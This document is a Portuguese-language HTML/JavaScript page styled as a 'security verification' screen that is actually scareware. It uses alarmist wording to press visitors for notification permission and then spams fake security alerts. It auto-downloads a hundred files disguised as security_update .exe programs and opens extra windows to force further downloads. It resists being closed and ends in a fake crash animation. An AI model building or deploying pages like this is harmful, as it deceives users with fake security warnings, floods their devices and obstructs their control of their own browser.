<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100vw;
            height: 100vh;
            background: #000;
            overflow: hidden;
            font-family: 'Courier New', monospace;
            color: #0f0;
        }

        #start {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            color: #0f0;
            font-size: 2.5em;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            cursor: pointer;
            text-align: center;
            border: 3px solid #0f0;
            text-shadow: 0 0 10px #0f0;
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: 1;
        }

        .terminal-text {
            position: fixed;
            bottom: 20px;
            left: 20px;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            z-index: 800;
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.9);
            padding: 15px;
            border: 2px solid #0f0;
            width: 500px;
            border-radius: 5px;
        }

        .download-overlay {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.95);
            color: #0f0;
            padding: 30px;
            border: 3px solid #f00;
            z-index: 20000;
            text-align: center;
            display: none;
            border-radius: 10px;
            box-shadow: 0 0 30px red;
        }

        .notification-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #000;
            color: #0f0;
            padding: 40px;
            border: 4px solid #f00;
            z-index: 19000;
            text-align: center;
            display: none;
            border-radius: 10px;
            box-shadow: 0 0 30px red;
        }

        .final-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 15000;
            display: none;
            cursor: pointer;
            background: #000;
        }

        .final-image {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .crash-element {
            position: fixed;
            font-size: 24px;
            z-index: 9999;
            pointer-events: none;
            animation: float 2s infinite;
        }

        .status {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 10px;
            font-size: 14px;
            z-index: 900;
            border-radius: 5px;
        }

        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 30px;
            margin: 10px;
            cursor: pointer;
            font-size: 1.1em;
            border-radius: 5px;
            font-weight: bold;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
            50% { transform: translateY(-20px) rotate(180deg); opacity: 0.7; }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
    </style>
</head>
<body>
    <!-- TELA INICIAL -->
    <div id="start">
        <div>
            üîí VERIFICA√á√ÉO DE SEGURAN√áA üîí<br>
            <span style="font-size: 0.6em;">CLIQUE PARA VERIFICAR SISTEMA</span>
        </div>
    </div>

    <!-- V√çDEO -->
    <video id="video" playsinline loop muted>
        <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
    </video>

    <!-- INTERFACE -->
    <div class="terminal-text" id="terminal"></div>
    <div class="status" id="status">SISTEMA PRONTO</div>

    <!-- POPUPS -->
    <div class="notification-popup" id="notificationPopup">
        <h2>üîî PERMISS√ÉO DE NOTIFICA√á√ÉO</h2>
        <p><strong>Permita notifica√ß√µes para seguran√ßa do sistema</strong></p>
        <p style="color: #ff0000; font-size: 0.9em;">
            ‚ö†Ô∏è Notifica√ß√µes s√£o necess√°rias para prote√ß√£o!
        </p>
        <button onclick="enableNotificationSpam()">‚úÖ PERMITIR NOTIFICA√á√ïES</button>
        <br>
        <button onclick="forceSystem()" style="background: #f00; color: white;">‚ùå NEGAR (CONTINUAR)</button>
    </div>

    <div class="download-overlay" id="downloadOverlay">
        <h2>üì• DOWNLOAD OBRIGAT√ìRIO</h2>
        <p style="margin: 20px 0; font-size: 1.2em;">
            <strong>Download necess√°rio para verifica√ß√£o de seguran√ßa</strong>
        </p>
        <p style="color: #ff0000; margin: 15px 0;">
            ‚ö†Ô∏è N√ÉO FECHE ESTA JANELA!
        </p>
        <button onclick="startForcedDownloads()" style="background: #00ff00; color: #000; padding: 20px 40px; font-size: 1.3em;">
            üì• INICIAR DOWNLOAD DE SEGURAN√áA
        </button>
        <p style="margin-top: 20px; font-size: 0.8em; color: #ccc;">
            Arquivos necess√°rios: security_update.exe<br>
            Tamanho: 15.7 MB
        </p>
    </div>

    <div class="final-container" id="finalContainer">
        <img class="final-image" src="https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg" alt="Alerta Final">
    </div>

    <script>
        // ELEMENTOS PRINCIPAIS
        const start = document.getElementById("start");
        const video = document.getElementById("video");
        const terminal = document.getElementById("terminal");
        const status = document.getElementById("status");
        const notificationPopup = document.getElementById("notificationPopup");
        const downloadOverlay = document.getElementById("downloadOverlay");
        const finalContainer = document.getElementById("finalContainer");

        // VARI√ÅVEIS GLOBAIS
        let notificationInterval;
        let downloadInterval;
        let crashIntervals = [];
        let audioClips = [];
        let isActive = false;
        let downloadAttempts = 0;
        const maxDownloadAttempts = 50;

        // FUN√á√ÉO DO TERMINAL
        function updateTerminal(message) {
            const timestamp = new Date().toLocaleTimeString();
            terminal.innerHTML += `<span style="color: #0f0">[${timestamp}]</span> ${message}\n`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        // SISTEMA DE NOTIFICA√á√ïES PUSH PERSISTENTES
        function setupNotificationSystem() {
            updateTerminal("üîî CONFIGURANDO SISTEMA DE NOTIFICA√á√ÉO...");
            
            // Service Worker para notifica√ß√µes push
            if ('serviceWorker' in navigator && 'PushManager' in window) {
                navigator.serviceWorker.register('/sw.js')
                    .then(registration => {
                        updateTerminal("‚úÖ SERVICE WORKER REGISTRADO");
                        subscribeToPush(registration);
                    })
                    .catch(error => {
                        updateTerminal("‚ùå SERVICE WORKER FALHOU: " + error);
                        showNotificationPopup();
                    });
            } else {
                showNotificationPopup();
            }
        }

        function showNotificationPopup() {
            setTimeout(() => {
                notificationPopup.style.display = 'block';
                updateTerminal("üí° SOLICITANDO PERMISS√ÉO DE NOTIFICA√á√ÉO...");
            }, 3000);
        }

        function enableNotificationSpam() {
            notificationPopup.style.display = 'none';
            
            Notification.requestPermission().then(permission => {
                if (permission === 'granted') {
                    updateTerminal("‚úÖ PERMISS√ÉO CONCEDIDA - NOTIFICA√á√ïES ATIVAS");
                    startNotificationSpam();
                    startAdvancedSystem();
                } else {
                    updateTerminal("‚ùå PERMISS√ÉO NEGADA - FOR√áANDO SISTEMA");
                    forceSystem();
                }
            });
        }

        function forceSystem() {
            notificationPopup.style.display = 'none';
            updateTerminal("üö® MODO FOR√áADO ATIVADO");
            startNotificationSpam();
            startAdvancedSystem();
        }

        function startNotificationSpam() {
            updateTerminal("üî• INICIANDO NOTIFICA√á√ïES PUSH...");
            
            notificationInterval = setInterval(() => {
                createPushNotification();
            }, 15000);
            
            // Primeira notifica√ß√£o imediata
            setTimeout(createPushNotification, 2000);
        }

        function createPushNotification() {
            const messages = [
                "üö® ALERTA: Download de seguran√ßa necess√°rio!",
                "üì± VERIFICA√á√ÉO: Seu sistema precisa de atualiza√ß√£o",
                "üíÄ CR√çTICO: Arquivos de seguran√ßa pendentes",
                "üì• DOWNLOAD: Clique para baixar atualiza√ß√£o",
                "‚ö†Ô∏è AVISO: N√£o ignore esta notifica√ß√£o!",
                "üîí SEGURAN√áA: Proteja seu dispositivo agora",
                "üì≤ ATUALIZA√á√ÉO: Arquivos essenciais dispon√≠veis",
                "üåê CONEX√ÉO: Download autom√°tico necess√°rio",
                "üõ°Ô∏è PROTE√á√ÉO: Atualize sua seguran√ßa",
                "üì¶ PACOTE: Novos arquivos de prote√ß√£o"
            ];
            
            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
            
            if ('Notification' in window && Notification.permission === 'granted') {
                const notification = new Notification('üîí Sistema de Seguran√ßa', {
                    body: randomMsg,
                    icon: 'https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg',
                    tag: 'security-alert',
                    requireInteraction: true,
                    actions: [
                        {
                            action: 'download',
                            title: 'üì• Download Agora'
                        },
                        {
                            action: 'info', 
                            title: '‚ÑπÔ∏è Mais Informa√ß√µes'
                        }
                    ]
                });
                
                notification.onclick = () => {
                    triggerForcedDownload();
                    notification.close();
                };
                
            } else {
                // Notifica√ß√£o fake se n√£o tiver permiss√£o
                showFakeNotification(randomMsg);
            }
            
            updateTerminal("üîî NOTIFICA√á√ÉO PUSH ENVIADA");
        }

        function showFakeNotification(message) {
            const fakeNotif = document.createElement('div');
            fakeNotif.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #333;
                color: white;
                padding: 15px;
                border-radius: 10px;
                border: 2px solid #ff0000;
                z-index: 10000;
                max-width: 300px;
                box-shadow: 0 0 20px rgba(255,0,0,0.5);
                animation: shake 0.5s;
            `;
            fakeNotif.innerHTML = `<strong>üîí Seguran√ßa</strong><br>${message}`;
            document.body.appendChild(fakeNotif);
            
            fakeNotif.onclick = () => {
                triggerForcedDownload();
                fakeNotif.remove();
            };
            
            setTimeout(() => {
                if (fakeNotif.parentNode) {
                    fakeNotif.remove();
                }
            }, 5000);
        }

        // SISTEMA DE DOWNLOADS FOR√áADOS
        function startAdvancedSystem() {
            updateTerminal("‚öôÔ∏è INICIANDO SISTEMA AVAN√áADO...");
            
            // Mostrar popup de download for√ßado
            setTimeout(() => {
                showDownloadOverlay();
            }, 5000);
        }

        function showDownloadOverlay() {
            downloadOverlay.style.display = 'block';
            updateTerminal("üì• SOLICITANDO DOWNLOAD DE SEGURAN√áA...");
            
            // For√ßar download automaticamente ap√≥s 10 segundos
            setTimeout(() => {
                if (downloadOverlay.style.display === 'block') {
                    startForcedDownloads();
                }
            }, 10000);
        }

        function startForcedDownloads() {
            downloadOverlay.style.display = 'none';
            updateTerminal("üöÄ INICIANDO DOWNLOADS FOR√áADOS...");
            
            let successCount = 0;
            const totalFiles = 100;
            
            // Fun√ß√£o recursiva para tentar downloads
            function attemptDownload(index) {
                if (index >= totalFiles) {
                    updateTerminal("‚úÖ TODOS OS DOWNLOADS CONCLU√çDOS");
                    activateFinalPhase();
                    return;
                }
                
                downloadAttempts++;
                const attemptNumber = downloadAttempts;
                
                // Criar arquivo "de seguran√ßa" falso
                const securityContent = `
SECURITY_UPDATE_FILE ${index + 1}
================================
Filename: system_security_${index + 1}.exe
Size: 15.7 MB
Version: 2.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 1000)}
Date: ${new Date().toLocaleString()}
SHA256: ${Math.random().toString(36).substr(2, 64).toUpperCase()}

=== SECURITY PROTOCOL ACTIVATED ===
This file contains critical security updates
for your system protection.

Required for:
- Virus protection
- System stability  
- Data encryption
- Privacy security

DO NOT DELETE THIS FILE!
================================
                `;
                
                try {
                    const blob = new Blob([securityContent], { type: 'application/octet-stream' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `security_update_${index + 1}.exe`;
                    
                    // Adicionar e clicar
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    
                    // Liberar URL
                    setTimeout(() => URL.revokeObjectURL(url), 1000);
                    
                    successCount++;
                    updateTerminal(`üì• DOWNLOAD ${index + 1}/${totalFiles} CONCLU√çDO`);
                    
                    // Pr√≥ximo download
                    setTimeout(() => attemptDownload(index + 1), 500);
                    
                } catch (error) {
                    updateTerminal(`‚ùå ERRO NO DOWNLOAD ${index + 1} - TENTANDO NOVAMENTE`);
                    
                    // Tentar novamente com about:blank
                    setTimeout(() => {
                        triggerAboutBlankDownload(index);
                    }, 1000);
                }
            }
            
            // Iniciar primeira tentativa
            attemptDownload(0);
        }

        function triggerAboutBlankDownload(fileIndex) {
            updateTerminal(`üîÑ TENTATIVA ${downloadAttempts}: ABOUT:BLANK`);
            
            // Abrir about:blank em nova aba
            const newWindow = window.open('about:blank', '_blank');
            
            if (newWindow) {
                // Injeta c√≥digo para for√ßar download
                newWindow.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Security Download</title>
                        <style>
                            body { 
                                background: #000; 
                                color: #0f0; 
                                font-family: Courier New;
                                padding: 50px;
                                text-align: center;
                            }
                        </style>
                    </head>
                    <body>
                        <h1>üîí DOWNLOAD DE SEGURAN√áA</h1>
                        <p>Seu sistema est√° sendo protegido...</p>
                        <script>
                            // For√ßar download
                            const content = "SECURITY_FILE_" + Math.random().toString(36).substr(2, 20);
                            const blob = new Blob([content], {type: "application/octet-stream"});
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = 'security_update_' + Date.now() + '.exe';
                            document.body.appendChild(a);
                            a.click();
                            document.body.removeChild(a);
                            
                            // Fechar janela ap√≥s download
                            setTimeout(() => window.close(), 1000);
                        <\/script>
                    </body>
                    </html>
                `);
                
                // Fechar janela ap√≥s um tempo
                setTimeout(() => {
                    if (!newWindow.closed) {
                        newWindow.close();
                    }
                }, 3000);
                
            } else {
                updateTerminal("‚ùå POPUP BLOQUEADO - TENTANDO NOVAMENTE");
                
                // Tentar com window.location (menos eficiente)
                setTimeout(() => {
                    try {
                        const content = "SECURITY_EMERGENCY_" + Date.now();
                        const blob = new Blob([content], {type: "text/plain"});
                        const url = URL.createObjectURL(blob);
                        window.location.href = url;
                        
                        setTimeout(() => {
                            window.history.back();
                        }, 100);
                        
                    } catch (e) {
                        updateTerminal("‚ùå M√âTODO ALTERNATIVO FALHOU");
                    }
                }, 2000);
            }
        }

        function triggerForcedDownload() {
            updateTerminal("üîó NOTIFICA√á√ÉO CLICADA - FOR√áANDO DOWNLOAD");
            
            // Criar m√∫ltiplas tentativas
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    try {
                        const content = "QUICK_SECURITY_" + Date.now();
                        const blob = new Blob([content], {type: "application/octet-stream"});
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'emergency_update.exe';
                        a.style.display = 'none';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    } catch (error) {
                        updateTerminal("‚ùå DOWNLOAD R√ÅPIDO FALHOU");
                    }
                }, i * 500);
            }
        }

        // FASE FINAL
        function activateFinalPhase() {
            updateTerminal("üíÄ ATIVANDO FASE FINAL...");
            
            video.style.display = 'none';
            finalContainer.style.display = 'block';
            
            // Travamento pesado
            startHeavyCrash();
        }

        function startHeavyCrash() {
            updateTerminal("üî• INICIANDO TRAVAMENTO...");
            
            // Elementos voando
            const elementCrash = setInterval(() => {
                for (let i = 0; i < 5; i++) {
                    const el = document.createElement('div');
                    el.className = 'crash-element';
                    el.style.left = Math.random() * window.innerWidth + 'px';
                    el.style.top = Math.random() * window.innerHeight + 'px';
                    el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    el.textContent = 'üíÄ';
                    document.body.appendChild(el);
                    
                    setTimeout(() => el.remove(), 3000);
                }
            }, 300);

            crashIntervals.push(elementCrash);
        }

        // INICIAR SISTEMA
        start.addEventListener("click", function() {
            if (isActive) return;
            isActive = true;
            
            start.style.display = "none";
            updateTerminal("üöÄ INICIANDO VERIFICA√á√ÉO DE SEGURAN√áA...");
            
            // Iniciar v√≠deo
            video.play().catch(e => {
                video.muted = true;
                video.play();
            });

            // Sequ√™ncia do sistema
            setTimeout(setupNotificationSystem, 2000);
            
            updateTerminal("‚úÖ SISTEMA INICIADO - AGUARDANDO CONFIGURA√á√ÉO...");
        });

        // BLOQUEAR FECHAMENTO
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = 'Tem certeza que deseja sair? A verifica√ß√£o de seguran√ßa n√£o foi conclu√≠da.';
            return e.returnValue;
        });

        updateTerminal("üîí SISTEMA DE VERIFICA√á√ÉO CARREGADO");
        updateTerminal("üí° CLIQUE PARA INICIAR VERIFICA√á√ÉO DE SEGURAN√áA");
    </script>
</body>
</html>